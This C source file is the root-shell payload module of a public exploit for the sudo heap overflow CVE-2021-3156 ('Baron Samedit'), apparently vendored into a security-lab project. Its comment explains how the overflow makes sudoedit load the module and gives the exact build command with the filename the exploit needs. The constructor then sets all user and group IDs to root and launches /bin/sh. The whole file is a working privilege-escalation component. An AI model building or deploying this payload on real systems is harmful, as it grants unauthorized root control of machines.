/*
 * lib.c - CVE-2021-3156 (Baron Samedit) root payload shared object.
 *
 * Vendored from the public exploit by blasty <peter@haxx.in>
 * (github.com/blasty/CVE-2021-3156). The heap overflow crafted by
 * baron_samedit.c corrupts sudoedit's LC_ALL handling so that glibc's NSS
 * loader dlopens this module inside the setuid-root sudoedit process; the
 * constructor below drops to a root shell.
 *
 * Build (note the deliberate output filename with a trailing space):
 *   cc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
 *
 * Authorized security-lab use only.
 */
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
    printf("[+] bl1ng bl1ng! We got it!\n");
#ifndef BRUTE
    setuid(0); seteuid(0); setgid(0); setegid(0);
    static char *a_argv[] = { "sh", NULL };
    static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
    execv("/bin/sh", a_argv);
#endif
}
